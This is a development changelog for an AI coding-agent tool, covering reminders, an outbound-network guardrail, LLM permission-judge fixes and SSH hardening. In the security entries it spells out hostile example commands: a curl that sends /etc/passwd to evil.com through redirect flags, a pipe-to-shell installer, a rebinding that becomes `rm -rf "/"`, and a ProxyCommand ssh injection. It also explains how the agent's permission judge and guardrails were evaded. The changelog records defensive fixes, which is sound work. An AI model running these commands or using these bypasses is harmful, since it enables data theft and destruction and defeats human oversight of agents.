+  genuinely differ: `executeJob` hardcodes *delete on `KindAt` fire*, which would erase the very record
+  you need to see ("did it ring?"), and a recurring at/every/cron schedule has no meaning for a
+  checklist entry. So the package has its own `Store`, `Service` and run loop, and reuses
+  `scheduler.Outbox` / `scheduler.RunHistory` / `Targets` by import.
+- **One delivery log, so reminders get Telegram, the RC bridge and the web Outbox panel for free.** A
+  firing appends to the SAME `deliveries.jsonl` the cron drainer already drains. That surfaced a latent
+  bug: the drainer sink dropped any delivery whose id was not in the cron store, so a reminder would
+  have been visible in the web Outbox while being silently lost remotely. It now recognises a
+  `<kind>:<id>` id and resolves it with the same workdir hint a cron job's `Payload.Owner` carries.
+- **The status machine is a table, and it is enforced in one place.** `pending | in_progress |
+  completed | cancelled`, with `allowedTransitions` in `internal/reminders/transition.go`. Every
+  non-terminal state can return to pending (the "unmark"); `completed` and `cancelled` are terminal
+  *with respect to each other*, so reopening is a single auditable move rather than several. The server
+  answers 409 for an illegal change and 400 for an unknown value — never a silent default.
+- **Two subtleties the tests forced out, both of which were real bugs:**
+  - Moving *to* pending clears `FiredAtMs`, which is what re-arms a one-shot item. Without it an
+    unmarked reminder could never ring again. `commitFire` then had to stop blindly restoring that
+    claim, or a reset made mid-agent-turn was silently undone.
+  - `nextDelayLocked` now shares `Item.Active()` with `Item.Due()`. They disagreed once, and a
+    disagreement is a *livelock*, not a cosmetic bug: the loop computed a zero delay from an item the
+    firing gate then refused, so it spun at 100% CPU forever. `TestNextDelayAgreesWithDue` exists to
+    keep that from coming back.
+- **Firing.** A reminder (or a task with a due date) either notifies — desktop notification via the
+  event bus, no model, no token cost — or runs a real agent turn, per item. A task may additionally
+  `auto_complete`, but only on a successful turn: a turn that returns cleanly is not proof the work was
+  finished, so it is opt-in and the user can always unmark. There is no magic marker in the model's
+  output; a spoofable string is not a completion signal.
+- **The agent runner is reused, not copied.** A reminder is projected onto a `scheduler.Job`
+  (`reminderItemAsCronJob`) and handed to the existing runner, so the per-firing `lspMgr.Close()` /
+  `ag.Shutdown()` cleanup — whose absence leaks a goroutine bundle per firing — cannot drift. The
+  `rt-` id prefix keeps a reminder transcript from sharing a file with an unrelated cron job.
+- **UI.** One sub-tab switcher inside the Cron tab (Jobs | Reminders | Tasks) rather than three
+  top-level tabs: all three read the same project store and share the outbox panel. All three panes
+  stay mounted so their filters, dialogs and scroll positions survive a switch, but a pane loads
+  LAZILY — opening the Cron tab costs the same three requests it always did, and only the front pane
+  polls. Every destructive action is a rendered `ConfirmDialog`, because native `window.confirm`
+  silently returns false in the desktop WKWebView.
+- **Also fixed by writing the tests:** `aria-controls` pointed at ids that did not exist (the switcher
+  names views in the plural, the API in the singular); the status filter updated state and then did
+  nothing, because the load effect did not depend on it; and `describeDueLabel` hardcoded
+  `Date.now()`, so it could not be rendered against an injected clock.
+- **Not done, recorded in `TODO.md`:** the TUI `/cron` command and the LLM-facing `cron` tool are
+  unchanged (web/desktop only in v1), so a TUI user cannot add a reminder or tick off a task, and an
+  agent asked to "remind me tomorrow" still has to use an `at`-kind cron job — which deletes itself on
+  firing. A firing also surfaces as an in-app event rather than an OS notification: there is no Wails
+  notification bridge wired yet.
+- **Two things the live smoke test caught that the unit tests had not.** An unknown status value was
+  answered with **409**, because the handler pre-validated through `Transition`, which wraps an
+  unknown value in the same sentinel as an illegal move — but a malformed value is a *field* error
+  (400) and only a known value the machine forbids is a *conflict* (409), so the two are now checked
+  separately. And `fired_at_ms` means "this firing has been CLAIMED", not "this firing has finished":
+  it is written at the start of the firing so a concurrent tick cannot double-fire the item, so a
+  reader can legitimately observe it set while the status is still `pending`. The field docs on both
+  sides now say so, and the smoke test polls for the settled status rather than for the flag.
+- Verified: `internal/reminders` 100% mutation-killed (16/16 mutants caught, each verified to compile
+  first); the FULL `internal/server` package green (157s, not a `-run` filter — the filter had been
+  silently skipping one of the new tests); `gofmt`/`go vet`/`go build ./...` clean; web
+  `tsgo --noEmit` and `vite build` clean; 38/38 Cron vitest cases and 2714/2715 of the full web suite
+  pass (the one failure is a new remote-project spinner test from concurrent work, no Cron overlap);
+  and a live end-to-end smoke run against a throwaway `serve` instance exercised create, status
+  round trips, the 400/409 split, firing-once, the shared outbox, re-arm-on-unmark, sorting,
+  pagination, run-now, cross-kind 404 and delete.
+
+## 2026-09-30 — a TypeSafe outbound-network guardrail now gates web fetch, web search and bash network calls
+
+- **The hole.** `Decide` returns a bare `PermissionAllow` for a `webfetch` whose domain the user once
+  allowed (the in-memory `webfetchDomains` cache), with no model consulted at all; `websearch` has no
+  domain policy whatsoever. So a fetch to an allowed-looking host left the machine with zero
+  examination, and the deterministic exfiltration detector only understands flag shapes, not whether
+  the request is one a developer would knowingly make.
+- **`internal/agent/network_guard_typesafe.go`** — a Jev guardrail over the three tools that can
+  actually egress: `webfetch` (url), `websearch` (query), and `bash` (any network-capable command,
+  found by reusing the existing `effectiveCommandWords` peel + `isNetworkSubprocessBinary`, so
+  `sudo env FOO=1 timeout 30 curl …` is seen). A URL in a `read` path or `write` body is content,
+  not a request, and never reaches the judge. Two questions per call: a typed `allow`/`escalate`
+  verdict plus a typed concern over a new 6-entry egress catalog (`secrets_in_request`, `data_upload`,
+  `untrusted_destination`, `internal_target`, `opaque_or_unresolvable`), deliberately NOT a reuse of
+  `typesafeConcerns` — that catalog answers "may this call run at all?", this one answers only "may
+  this request leave the machine?".
+- **Non-loopback only, and free.** No target, or every target loopback, means no Jev call, no latency
+  and no spend. Loopback uses the existing proofs: `isLocalhostDomain` for a URL, and for bash
+  additionally `subprocessTargetsLocalhost`, which voids itself on `--proxy`/`--resolve`/`-x`/
+  `--connect-to` — so `curl -x proxy http://localhost/` is correctly judged remote.
+- **Tighten-only, never widen.** The result struct has no field meaning "proceed"; it only answers
+  "should a human decide". A `PermissionDeny` is never rewritten, which is load-bearing: `curl
+  https://host/install.sh | sh` is `HardDeny` *and* carries a non-loopback target, so an unguarded
+  escalation handed a hard block to a human. Verified by mutation — removing the guard made the
+  hard-blocked command actually run.
+- **Fails open, deliberately.** Transport error, timeout, missing verdict, or an unrecognised choice
+  all fall back to the existing permission layer (webfetch/websearch are Ask by default) with a loud
+  `tier=netguard_fail`. A TypeSafe outage must not break web access, and it removes this layer
+  without removing the deterministic ones beneath it. **The exception the user should know about:
+  in YOLO mode `Decide` returns a bare allow at `permissions.go:1639` (bash) and `:1793` (all tools)
+  — before the exfiltration detector at `:1695`/`:1723` and before the webfetch domain check — so
+  there the guardrail is the only egress guard, and failing open means falling back to YOLO
+  semantics (which is what a YOLO user asked for).**
+- **Masks before it speaks.** Target values go through `judgeMaskRegistry()`/`redactText` exactly as
+  the permission judge does, and masking happens *before* the length clip so a secret is never cut in
+  half at the cap. The rubric is taught the `[[OCSEC:…:N]]` form and told to treat it as exactly the
+  credential it stands for, so detection survives the masking.
+- **Honours a caller context.** The call is `checkNetworkGuardCtx(ctx, …)`, so where a context is supplied the
+  judge round trip dies with it — currently only the orphan-recovery path (`agent.go:6209`). On the
+  ordinary turn the main dispatcher `handleToolCallWithImages` takes no context and passes
+  `context.Background()` (`agent.go:3181`), so a user abort does not reach an in-flight judge; the
+  call is bounded by its own 4s ceiling instead, which is the same treatment every other tool gets on
+  that path. Threading a real context through `handleToolCallWithImages` is a pre-existing,
+  agent-wide gap and is deliberately NOT changed here — it would alter cancellation for all tools.
+- **Tests** — 31 in `network_guard_typesafe_test.go` (fake `/systemone` httptest harness, mirroring
+  `discovery_typesafe_test.go`). The three security invariants are mutation-verified: a surviving
+  mutant is reported as caught only after `go build` confirms it compiles. `go test ./internal/agent/`
+  green, plus `-race` and `-count=2`; `gofmt`/`go vet` clean.
+- **Docs** — `docs/concepts/webfetch-websearch-guardrails.md`.
+
+## 2026-09-29 — the auto-permission judge can now settle `env`-shaped commands instead of deferring them
+
+- **The rubric had no rule for enumerating the environment, only for reading credential files.**
+  `typesafeJudgeInstructions` told Jev that reading a `.env`/`~/.ssh`/`auth.json` value and consuming
+  it locally is not a `secrets` concern, but said nothing about `env`/`printenv`/`set`. A command
+  carrying a trailing `sed 's/=.*/=<set>/'` therefore had to re-derive pipeline ordering on its own
+  before it could call the shape safe. Live: `cd <repo> && grep -ri … ; env | grep -i typesafe |
+  sed 's/=.*/=<set>/'` leaned ALLOW at 0.72 against the 0.85 floor and was handed to the human.
+- **One bullet closes it.** Environment enumeration is now explicitly the SAME rule as file reads — a
+  secret's *value* reaching output, a file, or another process is the concern, never the existence
+  of a variable — with the allowed forms spelled out (`env | cut -d= -f1`, `compgen -v`,
+  `env | sed 's/=.*/=<set>/'`, `env | grep -i TOKEN | sed 's/=.*/=/`), the reason each is safe
+  ("sed rewrites every line before anything is displayed"), an instruction to judge pipelines in
+  order and not deny on the bare presence of the word `env`, and the counter-case preserved: a bare
+  `env` with no filter that prints every value at once is still the concern.
+- **Tests** — `TestTypesafeJudgeInstructionsCarveOutEnvironmentNameListing` pins five distinctive
+  fragments, including both literal command shapes and the sed justification, so trimming the
+  allowed-forms list back out still fails; `TestTypesafeEnvironmentCarveOutIsInVerdictRubric`
+  asserts the clause sits in the VERDICT rubric (the concern rubric's answer is advisory and does
+  not gate the floor) and that the raw string contains no backtick — an unescaped backtick would
+  terminate the Go literal, which is exactly the build break the first attempt of this change hit.
+  Both mutation-verified: deleting the bullet fails both.
+- **Unchanged, deliberately.** The concern vocabulary, the floor resolvers, the `secrets` label and
+  the deny backstop are untouched. `permissions.auto.min_confidence` still defaults to 0.85 and an
+  explicitly configured value still governs; the opaque 0.75 relief remains gated on the judge
+  naming `truncated_or_unknown`.
+- **Open gap, tracked in `TODO.md`.** That same live call also answered the concern question `none`
+  while visibly hesitating, so the deferral carried no explanation and the opaque relief never
+  engaged. The rubric already tells the model not to do that and it did anyway, so the fix belongs
+  in the below-floor fallback reason, not here.
+
+## 2026-09-29 — `/recap` and the speak summariser lead with the bigger picture; the speak prompt is now four rules
+
+- **Both summarisers described process instead of point.** The full `/recap`
+  asked for five sections — WHAT USER WANT / WHAT FIND / DECISION / DO /
+  TASKS — and nothing about what any of it *meant*, so it read as a transcript
+  of the session rather than a state of things. The prompt now says to say what
+  it MEANS rather than what happened, to put the point that matters most first,
+  and to write for a reader catching up after a break. The five sections are
+  unchanged; the instruction is additive.
+- **The auto-recap line could only echo activity.** It was capped at 100
+  characters, which is about one clause — not enough to state a result *and*
+  what was done, so it spent its budget on the doing. It is now up to 200
+  characters and leads with the outcome (what was achieved or decided, and why
+  that matters) before naming the actions. Still one sentence, still rendered
+  as the single `recap: …` row the TUI transcript expects.
+- **The speak summariser's prompt was six long rules plus a conditional
+  three-bullet clause.** It is now four plain rules, each carrying the same
+  contract: talk about code rather than reading it, plain spoken sentences, two
+  to five sentences keeping what matters, and pass short plain prose and bare
+  questions through untouched. Every behavioural rule survived; the prose around
+  them did not.
+- **The bigger-picture opener for speech now fires from 800 characters, not
+  1200** (`speechSummaryRecapMinChars`). Roughly a minute of speech was too
+  late — by then the listener has stopped orienting and is only waiting for the
+  point. The gate still sits above the verbatim-speak threshold (400), so the
+  opener is never asked for a message that was never summarised.
+- **`speechSummaryPromptVersion` is bumped to `3`.** The summary cache is keyed
+  on message text and model id, so a prompt change is invisible to it; without
+  the bump, every summary written in the last 24h would keep serving output
+  from the previous prompt.
+- **Tests.** The two gating tests now assert the *presence and absence of the
+  clause constant itself* instead of a phrase copied out of it. The absence
+  check previously pinned the literal `"one-line recap"`, which no longer
+  existed anywhere after the rewrite — it would have passed no matter what the
+  code did. `/recap`'s prompt had no coverage at all and now has
+  `TestRecapFullAsksForTheBiggerPicture` and `TestRecapShortLeadsWithTheOutcome`.
+  All four prompt guards were mutation-verified: reverting each edit makes the
+  matching test fail.
+  (`internal/agent/agent.go`, `internal/agent/speech_summary.go`,
+  `internal/agent/speech_summary_test.go`, `internal/agent/recap_prompt_test.go`)
+
+## 2026-09-29 — The advisor model, triggers and on/off gate are per chat; the global config is only the new-chat default
+
+- **The advisor was one process-global value, so a pick in one chat repainted
+  every other chat.** Only the on/off gate had been scoped per session
+  (`advisor_enabled` in transcript metadata). The MODEL and the checkpoint
+  (trigger) set lived in `ocodeconfig.json` only, had no `session_id` on their
+  endpoints (`GET/PUT /api/config/advisor`), were stored as a single
+  `advisorModel` field in the chat store root, and were broadcast unguarded to
+  every tab by the status snapshot. Worse, the agent held the server's shared
+  `*config.Config` pointer, so a pick took effect in every already-open session
+  on the next advisor call — and in chats built under a profile or a
+  per-session reasoning level (which snapshot their config), only after a
+  rebuild. That asymmetry is gone.
+- **All three are now per session, pinned in the transcript.** `agent.AdvisorConfig`
+  (model + Claude Code backend + triggers) is installed on the agent at build
+  time from the session's own pin and re-set when the user changes it in that
+  chat. The pin (`advisor_model` / `advisor_claude_code` /
+  `advisor_checkpoints`) is written with the same targeted
+  `session.UpdateMetadataForDir` primitive as `advisor_enabled`, so it survives
+  resume, eviction and restart. A per-session write never touches
+  `ocodeconfig.json`; the unscoped endpoint keeps its old meaning and now
+  documents itself as "the default NEW chats start with".
+- **Pin-on-first-use, as chosen.** A session with no pin takes the current
+  default the first time it needs one (`pinSessionAdvisorConfig`, a
+  check-then-set — never an upsert — shared by the build and write paths, so
+  they cannot disagree). The first agent build pins it, so a brand-new chat
+  reflects the model selected for it. An EMPTY model is a real pinned value
+  meaning "use the built-in default", and `resolveModel` honours it instead of
+  falling through to a default that may since have changed.
+- **Snapshots and the UI follow the session.** `applySessionAdvisorFields` now
+  stamps the model and triggers as well as the gate, so a session-tagged status
+  carries that chat's values; the frontend routes a session-tagged snapshot to
+  the owning session (`SET_SESSION_ADVISOR_CONFIG`) and only an untagged one to
+  the shared new-chat default — the same deliberate guard the main model and the
+  gate already had. `ModelDialog` and `/advisor` write the current chat; the
+  Settings → Advisor form is now labelled as the new-chat default.
+- **Fixed en route: the Settings label stated the opposite of the behaviour.**
+  "Enabled for this session (not persisted)" called
+  `setAdvisorEnabled(runtimeEnabled)` with no `session_id`, which is the
+  process-wide write. The TUI's `/advisor` also needed `applyAdvisorConfigToAgent`
+  once the agent stopped reading `cfg` live, or the slash command would have
+  silently stopped affecting the running session.
+- **Tests** (all mutation-verified): 6 new server tests in
+  `internal/server/advisor_session_test.go` (pick isolation, default change
+  reaching only new chats, pin surviving eviction AND a real rebuild, pinned-to-
+  -default not following the global, per-session triggers, 404 on an unknown
+  session, per-session status snapshots, metadata round trip) plus a per-session
+  gate for the `SessionSlice` reducer and the `status` event route. Removing the
+  pin's check-then-set, the build-time seed, or the snapshot stamping each
+  fails tests. Full `internal/{server,agent,config,tui}` and the 307-file web
+  suite pass.
+
+## 2026-09-29 — Remote host registry keyed connections by host alone, so one port served another's traffic
+
+- **The connect cache ignored the SSH port.** `workspaceForPort`
+  (`internal/server/remote_hosts.go`) parsed the target, applied the saved
+  project's `RemotePort`, validated — and then the fast path looked up
+  `byHost[host]` and returned that entry regardless of the port. The port was
+  only honoured when an entry was CREATED, so the first port to connect served
+  every later request for that host: with `james@host` saved at ports 22 and
+  2222, port 2222's chat, git and file traffic was proxied to the port-22
+  server using the port-22 bearer token, and a project registered on port 22 was
+  never registered on port 2222 (the remote would not have it at all). Silent
+  cross-connection exposure, not just a spare tunnel.
+- **Entries are now keyed by connection.** A new `remoteConnectionKey(host,
+  port)` is the single identity, and `drop`, `status`, `snapshotForRestart`,
+  `proxyFor`, `isRegistered` and `markRegistered` all take the port. The
+  registry's `byHost` became `byConn`. `registeredPaths` is port-scoped too,
+  because registration happens on one specific remote server — the same path on
+  a second port has not been registered there and must be POSTed again. `drop`
+  is now deliberately scoped to one connection: another port on the same host is
+  a separate tunnel that must not be torn down because one failed.
+- **The same defect in the SSH mux socket.** `sshControlSocket`
+  (`internal/remote/execcmd.go`) hashed `t.String()` into the `ControlPath`, so
+  two ports on one host shared one multiplexing socket. ssh reuses an existing
+  master **without verifying it matches the requested destination**, so a
+  command aimed at port 2222 could execute over port 22's connection. It now
+  hashes `sshConnectionIdentity` (user+host+port).
+- **Behaviour change on upgrade: existing SSH mux sockets are orphaned.** The
+  `ControlPath` filename is a hash of the connection identity, so changing what
+  is hashed gives every target a new socket path. Masters established by the
+  previous build are no longer reused and are left to their `ControlPersist`
+  (600s) before ssh reaps them; the next request opens a fresh master. This is
+  a one-time, self-healing cost on the first remote request after upgrading —
+  no state is lost, because the mux socket is only a transport optimisation.
+- **One key, two packages, pinned against drift.** `remoteSlotKey` (the exec
+  pool) now delegates to `remoteConnectionKey`, so the pool and the registry
+  cannot disagree about what "the same connection" means — the drift that
+  produced this bug class. `internal/remote` cannot import `internal/server`, so
+  it exposes `SSHControlSocketIdentity`, and
+  `TestSSHControlSocketIdentityMatchesServerKey` asserts the two derivations
+  agree.
+- **An unspecified port stays distinct from an explicit 22, on purpose.** With
+  no `-p`, ssh resolves the port from `~/.ssh/config`, which may remap the
+  host's default away from 22. Folding "unspecified" into "22" would let a
+  config-dialed connection share a master with an explicit `-p 22` command. The
+  safe direction is more keys: splitting duplicates a master, merging runs
+  commands on the wrong connection. Pinned by a test so it is not "tidied up"
+  later.
+- **Regression tests** (`internal/server/remote_hosts_test.go`,
+  `internal/remote/execcmd_test.go`): two ports get distinct workspaces and
+  distinct tokens; a repeat request for a connected port is still a cache hit;
+  `drop` for one port leaves the other connected AND evicts the named one; the
+  registration set is per port; the mux path separates ports and users but
+  keeps an unspecified port distinct from an explicit one. All mutation-verified
+  — reverting each guard fails its test (one reserve-style mutant that only
+  broke the build was rejected as invalid rather than counted as caught).
+
+## 2026-09-29 — Speak button disables while it prepares, with a visible fallback on failure
+
+- **Pressing Speak gave no feedback and could be spammed.** `requestSpeech` was
+  fire-and-forget: the button stayed enabled while the request waited in the
+  queue, went through the speech summariser (an LLM call that can take many
+  seconds) and was synthesised, and a failure only surfaced later in the
+  toolbar.
+- **`requestSpeech` / `speak` now return an outcome** (`{ ok, error }`,
+  resolving rather than rejecting so fire-and-forget callers — terminal
+  selections, "Speak visible" — cannot produce unhandled rejections). A queue
+  item settles the caller's promise at playback START (not at the end of a
+  long read), and Stop/Next/clear/unmount settle outstanding waiters so a
+  button can never be left disabled. Failures before playback resolve
+  `ok:false` with the reason; summariser failures stay non-fatal (the full
+  text is spoken).
+- **New shared `SpeakButton`** (`web/src/components/Speech/SpeakButton.tsx`)
+  replaces every Speak surface — `AssistantText` (per-message),
+  `ThinkingBlock`, and ChatPanel's "Speak selection" / "Speak visible"
+  header buttons: disabled + `aria-busy` + spinner + "Speaking…" while
+  pending, re-enabled with an inline error and tooltip on failure, plus a
+  handler-level double-click guard. No silent engine fallback — a failed
+  local-engine read reports the error instead.
+- Tests: `SpeakButton.test.tsx` (pending/disabled/spinner, failure, throw,
+  double-click, empty text) and the `speak outcomes` block in
+  `SpeechProvider.queue.test.tsx` (ok at playback start, `ok:false` on
+  synthesis failure, Stop releases a still-summarising item, `requestSpeech`
+  with no provider and through the `ocode:speak` bridge). Files:
+  `web/src/components/Speech/SpeechProvider.tsx`, `SpeakButton.tsx`,
+  `web/src/components/Chat/MessageBubble.tsx`,
+  `web/src/components/Chat/TurnParts.tsx`,
+  `web/src/components/Chat/ChatPanel.tsx`.
+
+## 2026-09-29 — Judge prep: don't run repo code, don't show it a stale value, don't leak secrets
+
+- **The permission judge could be shown a value the shell would not use.**
+  The shell-variable expander that prepares a bash command for the judges only
+  tracked bare `NAME=value` statements, so `export`, `NAME+=`, `for`, `read`,
+  `unset` and assignments buried in `{ … }` were invisible: `D=/tmp/build;
+  export D=/; rm -rf "$D"` showed the judge `rm -rf "/tmp/build"` while the
+  shell ran `rm -rf "/"`. Any rebinding in a form the expander does not model
+  now marks the variable opaque, so `$D` reaches the judge unresolved
+  (fail-closed, matching the existing unresolved-variable handling).
+- **Judge prep no longer executes repo code.** The allowlisted
+  `python3 -c "…"` metadata substitutions ran in the project directory with the
+  CWD on `sys.path`, so a repo-local `sysconfig.py` executed *before* any
+  approval. They now run with `python3 -I` (isolated), which drops the project
+  directory from `sys.path`.
+- **Secret-looking substitution output is withheld.** `go env GITHUB_TOKEN`
+  output, and credentials embedded in a URL userinfo
+  (`GOPROXY=https://user:pass@…`) — which `QuickScan` does not match — are now
+  replaced by `<redacted>` before the command reaches the remote judge, exactly
+  as a secret-looking environment value already was.
+- **TTS: `stripMarkdown` no longer corrupts unspaced math.** `2*3*4` was
+  stripped to `234` by the italic pattern; italic now requires non-word (or
+  string-edge) flanks on both sides. Its 15 patterns are compiled once at
+  package init instead of on every playback chunk. (Double-underscore
+  names like `__init__` still render as `init` — left as-is, it reads better
+  aloud than underscores.)
+- Regression: `TestExpandBashForJudgeRebindingsAreOpaque`,
+  `TestExpandBashForJudgeWithholdsSecretSubstitution`, and the `2*3*4` /
+  `(*real*)` cases in `TestStripMarkdown` — each verified to fail against the
+  unfixed code. Files: `internal/agent/permission_shellvars.go`,
+  `internal/agent/permission_shellvars_test.go`, `internal/tts/playback.go`,
+  `internal/tts/tts_test.go`.
+
+## 2026-09-29 — A loopback curl is only local if nothing redirects it
+
+- **The curl/wget loopback carve-out could be steered off-host.**
+  `subprocessTargetsLocalhost` (the check that auto-allows a network command and
+  exempts it from the exfiltration gate) only inspected the visible target
+  tokens, so a redirect flag left `http://localhost/` in place while sending the
+  request elsewhere: `curl --connect-to ::evil.com:80 http://localhost/ -d
+  @/etc/passwd` passed as local-only. `--resolve localhost:443:evil.com`,
+  attached/clustered `-x`/`-e`/`-K`, `--config`, `--doh-url` and wget
+  `-e http_proxy=…` did the same.
+- **Fix:** any connection-redirecting flag now voids the carve-out outright, so
+  the command falls through to the ordinary remote-target and exfiltration
+  checks — not a hard deny. The short-option check is over-inclusive by design
+  (`-sx`, `-xhost`, `-euse_proxy=yes` all count); a false positive only costs
+  the auto-allow, never safety.
+- Regression: `TestLoopbackCarveOutRejectsConnectionRedirectFlags` (14 redirect
+  cases plus a benign set covering `-sSL`, `-o`, `-H`, `-d`, `-X`), verified to
+  fail against the pre-fix helper. Files:
+  `internal/agent/permission_interpreter.go`,
+  `internal/agent/permissions_exfil_gaps_test.go`.
+
+## 2026-09-29 — Jump between your own prompts: `Alt+↑` / `Alt+↓` in the transcript (TUI + web/desktop)
+
+- **There was no way to step between the messages you had sent in one chat.**
+  The composer's plain `↑`/`↓` walks what you *typed* (input history) and the
+  find bar walks *matches*, so on a long session the only route back to an
+  earlier prompt was manual scrolling. `Alt+↑`/`Alt+↓` now step between the user
+  messages themselves, on both the TUI and the web/desktop UI (one React
+  implementation, so the desktop app is covered by the same change), with a
+  `msg N/M` readout in the TUI status bar and in a floating pill on web.
+  Deliberately *not* bound to bare `↑`/`↓`: on web those belong to prompt
+  history, and hijacking them would break the feature that already owns them.
+- **The count has to mean the same thing on both surfaces, so it comes from the
+  server.** The web client only holds a tail window of a transcript (capped at
+  `MAX_SLICE_MESSAGES`), so a client-side count would disagree with the TUI on
+  the very same session. New `GET /api/sessions/{id}/user-messages` returns the
+  full-transcript index list (`total`/`indices`/`truncated`/`scanned`, same
+  shape and limit clamping as the find-bar search endpoint, reusing
+  `session.PaginatedLoad` so it costs a scan rather than a new parse). The TUI
+  reads its list in-process through the same counting rule the TUI already used
+  for session titles, and the web client keeps a mirror of that predicate purely
+  as an offline fallback — so a failed request degrades to "what is loaded"
+  instead of the feature going dead.
+- **A slash command is chrome, not conversation.** `/theme` and friends are
+  `role: "user"` rows, so a naive count would make "msg 3/17" disagree with what
+  the user perceives as their prompts. Both sides skip a countable message whose
+  content starts with `/` (after trimming leading whitespace). A message with
+  empty or whitespace-only content still counts, because the TUI's existing
+  `isVisibleUserMessage` counts it and the whole point of the shared predicate is
+  that both surfaces agree on the denominator.
+- **Two decisions that are easy to get wrong, and are now pinned by tests.**
+  *No wrap-around*: the find bar wraps, but wrapping while walking a document
+  makes the ends feel broken — alt+up past the oldest teleports you to the newest
+  and the next alt+up looks dead — so the cursor clamps. *The seed*: the first
+  press in **either** direction enters at the newest user message, because the
+  user is at the bottom of the conversation and that is the nearest entry point;
+  it also keeps the two keys symmetric so neither is ever a silent no-op.
+- Implementation notes: the TUI reuses the find bar's
+  `flashAndScrollToMessage`, extracted out of `jumpToChatMatch` for the second
+  caller, so a jump highlights the same way a search hit does. On web the index
+  list is fetched **lazily on the first keypress** (a session that is read and
+  never jumped in must not cost a request per open), and the readout clears
+  whenever the tab switches session, since the cursor was a position in the
+  previous session's list. A side effect worth knowing: the existing follow-tail
+  listener treats a bare `ArrowUp` as scroll intent, so a jump also un-pins the
+  auto-scroll — which is what we want, or streaming would yank the view back to
+  the bottom after a deliberate jump.
+
+## 2026-09-29 — Remote target hardening: ssh option injection, port-blind connection keys, and swallowed git probe failures
+
+- **A remote project host could be crafted to run a local command.** `ssh`
+  receives `[user@]host` as one bare argv element with no `--` separator, and
+  neither `ParseTarget` nor `Target.Validate` rejected a leading `-`, so a
+  single-token host was parsed by ssh as an OPTION. Verified against real
+  OpenSSH 10.3: `ssh -oBatchMode=yes '-oProxyCommand=id>~/marker' 127.0.0.1`
+  created the marker, because ssh consumed the injected `-o` and ran its
+  `ProxyCommand` through a shell. Reachable from an authenticated caller via
+  `POST /api/projects` and `POST /api/projects/duplicate`, and the project is
+  PERSISTED — one request plants a payload that re-fires on every later connect
+  and git call. Three barriers now: `ParseTarget` rejects a leading `-` on the
+  host *after* the `user@` split (checking the whole string would miss
+  `user@-oProxyCommand=id`, whose token only starts with `-o` after the user is
+  prepended) and on the user; `Validate` repeats it, because callers that build
+  a `Target` field-by-field from a request body (`HandleUpdateProject`) never
+  reach `ParseTarget`; and `Target.SSHArgs` now emits the `--` terminator so the
+  invariant lives in one place rather than per caller. The separator sits
+  AFTER the `-p` port flag and immediately before the destination — ssh reads the
+  first non-option element as the hostname, so the reverse order makes it read
+  `-p` as the host. Legitimate targets are unaffected, including interior
+  dashes and IPv6 literals.
+- **The remote exec slot pool conflated separate connections.** The pool was
+  keyed on `Target.String()`, which drops the SSH port and is identical for two
+  users, so one 8-slot pool covered several independent connections — each with
+  its own sshd `MaxSessions` budget — and let unrelated projects throttle one
+  another. The key now carries the port as well. The same port-free string also
+  keyed `sshControlSocket`, so two ports on one host shared one `ControlPath`
+  mux socket; ssh multiplexes onto an existing master without checking it
+  matches the requested port, so a command could run on the other port's
+  connection. `String()` itself is unchanged — it is the port-free canonical
+  project identity the store persists, and every command site compensates with
+  an explicit `-p`.
+- **Long-running remote commands could starve git status.** Eight concurrent
+  remote shell commands could take every slot, after which the 10s `git_status`
+  poll for that host queued behind them and timed out at its own 30s bound,
+  staling the whole Git panel. A sub-cap now reserves 6 of the 8 slots for
+  short-lived foreground work (git status/diff, file reads, the shell probe);
+  long-running commands (remote shell, git network ops) are refused at 6 rather
+  than queued, so they cannot reclaim the pool as foreground work drains. The
+  reserve is a sub-cap on the same pool, not a second pool, so total concurrency
+  still cannot exceed 8.
+- **`gitStatusForDir` reported every probe failure as "not a repository".** Only
+  a timeout was distinguished; a missing `git` binary and a `safe.directory`
+  refusal both exited 128, hit the same branch, and were discarded — so a server
+  with no git on PATH reported every project as a plain directory, and a
+  dubious-ownership refusal was indistinguishable, with nothing logged. The
+  repo-ness probe now classifies: a genuine non-repo stays a normal
+  `IsRepo:false` with no error, and everything else is returned carrying git's
+  own message. Git exits 128 for both, so the decision rests on stderr text and
+  the probe now pins `LC_ALL=C` (reusing the existing `withoutLCAll`/
+  `probeCLocale` helpers) to keep that text locale-stable. Classification runs on
+  the RAW `cmd.Output()` error, before the existing fold that renders stderr via
+  `%s` and so drops the `*exec.ExitError`.
+- **Regression tests:** `internal/remote/target_test.go` (leading-dash rejection
+  at both layers, plus legitimate-dash and IPv6 guards),
+  `internal/remote/execcmd_test.go` and `internal/remote/ssh_test.go` (the `--`
+  separator and its position relative to `-p`),
+  `internal/server/git_status_timeout_test.go` (missing git and dubious
+  ownership, the latter via git's own `GIT_TEST_ASSUME_DIFFERENT_OWNER` hook),
+  `internal/server/remote_exec_slots_test.go` (port and user separation, and
+  the foreground reserve). All mutation-verified: reverting each guard fails its
+  test. One reserve variant was an equivalent mutant — reordering only the
+  whole-pool wait, with the sub-cap still gating admission — so it is not a
+  coverage gap.
+
+## 2026-09-29 — Cowork sidebar: no more horizontal scrollbar on chats with a broken language server
+
+- **The right-hand Cowork sidebar grew a horizontal scrollbar on some chats.** In
+  the LSP section, a row whose server had `state: "failed"` renders the server's
+  `detail` — a raw exec/stderr string like `failed to start gopls: exec: "gopls":
+  executable file not found in $PATH` — as the row's status label, inside a
+  `flex-shrink-0` span. That removed the flex item's ability to shrink below its
+  content width, so one long failure message pushed the row past the 288px pane.
+  The sidebar's scroller is `overflow-y-auto` with no `overflow-x` guard, and CSS
+  makes the other axis compute to `auto`, so the pane showed a horizontal
+  scrollbar. Only chats whose session actually had a failed language server were
+  affected, which is why it looked chat-specific. Measured in a real browser
+  against the app's own CSS: the scroller measured `scrollWidth` 1051px against a
+  287px `clientWidth`; it now measures 287/287.
+- **The status now truncates, and a click reveals the whole error.** A failed
+  server's status became a button that toggles the full message in place
+  (`truncate` when collapsed, `whitespace-pre-wrap break-words` when expanded, so
+  the pane grows vertically instead of horizontally), with `aria-expanded` and
+  the same title hint the sidebar's session-title expand already uses. Expansion
+  is per server, keyed like the row key. Short labels (`clean`, `N errors`) are
+  now `min-w-0 truncate` as well, so a future long label cannot silently
+  reintroduce the overflow, and the old line that re-printed the same `detail`
+  under the row is gone — the toggle owns the full text now. No
+  `overflow-x-hidden` was added to the sidebar or its scroller: that would mask
+  the defect and clip legitimate content.
+- **Regression test:** `web/src/components/Layout/CoworkSidebar.lsp.test.tsx`
+  (3 tests). jsdom has no layout engine, so it pins the CSS contract, and it is
+  mutation-verified — restoring `flex-shrink-0`, dropping the toggle, and
